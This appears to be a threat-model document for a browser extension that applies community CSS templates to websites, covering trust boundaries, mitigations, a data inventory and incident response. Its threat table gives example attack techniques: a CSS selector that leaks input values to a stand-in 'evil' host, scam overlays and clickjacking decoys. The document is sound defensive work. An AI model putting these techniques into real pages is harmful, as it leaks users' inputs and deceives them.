# Security Model

Non-negotiables are summarized in `AGENTS.md`. Research background: `docs/research/security-and-legal.md` (partial).

## 1. Assets to protect

1. Users' browsing privacy (what sites/pages they visit, what's on them).
2. Integrity of the pages users see (no scams, no hidden warnings, no fake UI).
3. Users' credentials/inputs on target sites.
4. The distribution channel (catalog, signing key, CI).
5. Store standing (Chrome Web Store / AMO policy compliance).

## 2. Trust boundaries

| Component | Trusted? | Notes |
|---|---|---|
| Extension code (packaged, reviewed by store) | Trusted | Only code that runs |
| Adapters (platform-maintained data) | Trusted after review + signature | Data only; still validated by schema |
| Curated templates (ours) | Trusted after review + signature | Still go through the sanitizer |
| Community templates | **Untrusted** | Sanitized server-side and client-side; human review in Phase 2 |
| Locally imported / authored templates | **Untrusted** | Sanitized; not signed; never uploaded automatically |
| Target website | **Untrusted** | May detect, tamper with, or probe the extension |
| Catalog server / R2 | **Untrusted for integrity** | Signatures make a compromised server harmless |

## 3. Threats and mandatory mitigations

| # | Threat | Example | Mitigation (must be implemented) | Where |
|---|---|---|---|---|
| T1 | CSS data exfiltration / tracking | `input[value^="a"]{background:url(https://evil/a)}`; `@import` beacons; `@font-face` `unicode-range` leaks | **No network from template CSS** (D-014): reject `@import`, any external `url()`/`image-set()`/`src()`, `@font-face` sources other than `asset()`; reject authored `data:` URLs (assets only via `asset()`); sanitizer in **both** server/CI and extension | compiler |
| T2 | UI redress / scam overlays | `::before{content:"Call support: +1-…"}`; hiding "This video may be misleading" labels; shrinking/hiding consent or security notices; overlaying fake buttons | `content` strings > 3 chars flagged for human review; adapter `protected` components cannot be hidden/zero-sized/transparent (compiler checks `display`, `visibility`, `opacity`, `clip-path`, `transform: scale(0)`, `font-size:0`, off-screen positioning on them); templates never apply on adapter `sensitive` routes | compiler, adapters, review |
| T3 | Clickjacking-style tricks | `pointer-events:none` on real buttons + positioned decoys | Flag `pointer-events` + `position:fixed/absolute` combinations on interactive components for review | compiler (warning), review |
| T4 | Performance DoS | deep `:has()` chains, `*` selectors with heavy effects, infinite animations of `filter` | Size limits, `:has()` depth ≤ 4, selector count ≤ 5,000, CI style-recalc benchmark on fixtures (warn > 50 ms) | compiler, CI |
| T5 | Supply chain: compromised server or bucket | Attacker swaps a bundle in R2 | Ed25519 signature over canonical JSON + per-asset SHA-256; public keys pinned in extension; key only in protected CI environment; rollback protection via index `issuedAt` | extension, CI |
| T6 | Compromised creator account | Malicious new version of a popular template | Every new version re-reviewed (diff view); PATCH-fast-path only if no flagged rules; revocation list (signed, checked every update cycle) | CI, review |
| T7 | Dependency compromise in the extension | Malicious npm update | Minimal deps; lockfile; pinned versions; Renovate PRs reviewed; no remote code; strict default extension CSP | repo |
| T8 | Site fingerprinting / hostile detection | LinkedIn-style probing of `web_accessible_resources` | Expose **no** web-accessible resources; no DOM markers (adopted sheets leave no nodes); no globals in page world | extension |
| T9 | Message spoofing | Page sends crafted messages | Content script ignores `window.postMessage`; all runtime messages schema-validated; `externally_connectable` limited to our domain (M7) | extension |
| T10 | Privacy leak via telemetry | URLs in reports | No telemetry by default; opt-in reports carry only ids/versions/probe ids; never URLs, titles, DOM text; screenshots only if user attaches manually (M8+) | extension, api |

Attack fixtures: `packages/compiler/test/attacks/*.css`, one file per row above (T1–T4), each with an expected error/warning code. **The sanitizer is done when every fixture is caught.**

## 4. Data inventory

| Data | Where | Leaves device? | Retention |
|---|---|---|---|
| Site assignments, settings, installed templates | `chrome.storage.local` (+ `storage.sync` for small prefs) | Only via the user's own Chrome sync | Until uninstall |
| Compiled CSS, probe health | `chrome.storage.local` | No (M8: opt-in aggregate probe results only) | Overwritten |
| Template downloads | Worker logs (M7) | Yes: template id/version, IP in transit | Don't persist IPs; counters aggregated by day |
| Breakage reports (M8, opt-in) | D1/Analytics Engine | Yes: ids, versions, failed probe ids | 90 days |
| Accounts (M9) | D1 | Yes | Until account deletion |

Privacy policy (T-6.2) must match this table exactly; CWS "Limited Use" disclosures follow from it.

## 5. Review process (Phase 2)

1. CI validator: errors block; warnings and flags labeled on the PR.
2. Human review checklist: name/branding rules (template-schema §10), screenshots free of personal data, flagged `content` strings, protected-component checks, licensing of bundled fonts/images.
3. Merge → sign → publish. Target turnaround: 48 h.
4. Post-publish: breakage reports and abuse reports → revoke if needed (revocation reaches users within one update cycle, ≤ 6 h).

## 6. Incident response (minimal)

| Event | Action | Target time |
|---|---|---|
| Malicious template found | Add to revocations, re-sign index, notify affected users in popup | ≤ 2 h |
| Signing key suspected leaked | Ship extension update with new key set + revoke old `keyId`; re-sign catalog | ≤ 24 h (store review dependent) |
| Site redesign breaks adapter | Adapter PATCH via catalog (M7+) or extension release (MVP-1) | ≤ 72 h (Gate A), ≤ 48 h (Gate B) |
| Legal takedown (DMCA/ToS) | Revoke + delist; follow notice procedure | per policy |
